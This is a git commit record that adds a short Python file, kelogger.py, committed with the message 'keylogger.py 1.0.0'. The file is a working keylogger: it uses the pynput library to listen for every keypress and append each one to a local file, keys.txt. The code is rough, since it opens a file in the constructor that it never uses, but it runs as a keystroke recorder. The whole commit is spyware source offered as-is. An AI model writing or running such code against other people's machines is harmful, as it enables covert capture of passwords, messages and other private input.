455480f95f1734ece6b61e2d27d32d6c160ed551
yosef ohayon <yyo6420@gmail.com>
2025-08-31 13:43:28 +0300

    keylogger.py 1.0.0

---
+++ kelogger.py
@@ -0,0 +1,22 @@
+from pynput.keyboard import Listener
+
+class KeyLogger:
+    def __init__(self, file_name):
+        self.listener = Listener(on_press = self.record_key)
+        self.file = open(file_name, 'a')
+
+    def record_key(self, key):
+        with open('keys.txt', 'a') as file:
+            file.write(f"the key {key} is pressed\n ")
+
+    def setup(self):
+        self.listener.start()
+
+    def join(self):
+        self.listener.join()
+
+if __name__ == '__main__':
+    key_logger = KeyLogger('keys.txt')
+    key_logger.setup()
+
+    key_logger.join()
